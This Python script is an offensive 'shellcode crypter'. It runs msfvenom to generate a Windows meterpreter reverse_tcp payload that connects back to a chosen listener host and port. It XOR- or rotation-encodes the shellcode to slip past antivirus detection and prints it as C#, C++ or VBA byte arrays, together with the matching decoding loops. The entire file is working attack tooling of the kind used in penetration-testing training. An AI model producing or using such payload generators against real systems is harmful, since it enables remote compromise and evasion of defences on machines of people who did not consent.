#!/usr/bin/python3

# Basic shellcode crypter for C# payloads
# By Cas van Cooten

import re
import platform
import argparse
import subprocess
from random import randint

if platform.system() != "Linux":
    exit("[x] ERROR: Only Linux is supported for this utility script.")

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Parse input arguments
def auto_int(x):
    return int(x, 0)

SUPPORTED_FORMATS = ['cs', 'cpp', 'vba']
SUPPORTED_ENCONDING = ['xor', 'rot']

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use")
parser.add_argument("format", help="the language to format the output in ('cs', 'cpp' or 'vba')", choices=SUPPORTED_FORMATS, nargs='?', default="cs")
parser.add_argument("encoding", help="the encoding type to use ('xor' or 'rot')", choices=SUPPORTED_ENCONDING, nargs='?', default="xor")
parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_tcp)", nargs='?', default="windows/x64/meterpreter/reverse_tcp")
args = parser.parse_args()


def print_payload(payload, format, decryption_routine):
    if len(payload) > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in {format} format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload ({format}):{bcolors.ENDC}")
        print(payloadFormatted + "\n")
    
    if len(decryption_routine):
        print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
        print(decryption_routine)
    

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

# Get the payload bytes and split them
payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replace('\n', '').split(",")


decoding_routine = ''
payloadFormatted  = f"[*] msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
payloadFormatted += f"[i] {args.encoding}-encoded with key {hex(args.key)}\n"

# Format the output payload
if args.format == "cs": 
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    for i, byte in enumerate(payload):
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255

        payload[i] = "{0:#0{1}x}".format(byteInt,4)

    payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
    payloadFormatted += f"byte[] buf = new byte[{str(len(payload))}] {{\n{payload.strip()}\n}};"

    # Provide the decoding function for the heck of it
    if args.encoding == "xor":
        decoding_buffer = f'buf[i] = (byte)((uint)buf[i] ^ {hex(args.key)});'
    else:
        decoding_buffer = f'buf[i] = (byte)(((uint)buf[i] - {hex(args.key)}) & 0xFF);'

    decoding_routine = f"""for (int i = 0; i < buf.Length; i++)
{{
    {decoding_buffer}
}}"""


if args.format == "cpp":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    encodedPayload = []
    for byte in payload:
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255

        encodedPayload.append(f"\\x{byteInt:02x}")

    payload = re.sub("(.{64})", "    \"\\1\"\n", ''.join(encodedPayload), 0, re.DOTALL)

    payloadFormatted += f"unsigned char buffer[] =\n    {payload.strip()};"

    # Provide the decoding function for the heck of it
    if args.encoding == "xor":
        decoding_buffer = f'bufferx[i] = (char)(buffer[i] ^ {hex(args.key)});'
    else:
        decoding_buffer = f'bufferx[i] = (char)(buffer[i] - {hex(args.key)} & 255);'

    decoding_routine = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    {decoding_buffer}
"""

elif args.format == "vba":
    formated_payload = ''
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    max_line_length = 50
    for i, byte in enumerate(payload):
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Encoding type not supported for VBA right now.{bcolors.ENDC}")

        if i == (len(payload) - 1):
            formated_payload += f'{byteInt}'
        else:
            formated_payload += f'{byteInt}, '
            if i != 0 and i % (max_line_length - 1) == 0:
                formated_payload += '_\n'

    payloadFormatted += f"buf = Array( _\n{formated_payload})"
    decoding_routine = f"""For i = 0 To UBound(buf)
    buf(i) = buf(i) Xor {args.key}
Next i"""

print_payload(payload, args.format, decoding_routine)
